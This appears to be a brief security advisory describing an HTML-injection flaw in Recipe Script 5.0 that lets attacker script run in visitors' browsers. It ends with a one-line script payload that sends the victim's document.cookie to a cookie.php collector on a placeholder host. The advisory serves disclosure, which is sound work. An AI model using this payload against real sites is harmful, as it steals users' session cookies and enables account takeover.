Recipe Script is prone to an HTML-injection vulnerability because it fails to properly sanitize user-supplied input before using it in dynamically generated content.

Successful exploits will allow attacker-supplied HTML and script code to run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user. Other attacks are also possible.

Recipe Script 5.0 is vulnerable; other versions may also be affected.

<script>document.location ="http://localhost/[path]/cookie.php?cookie=" + document.cookie;</script>
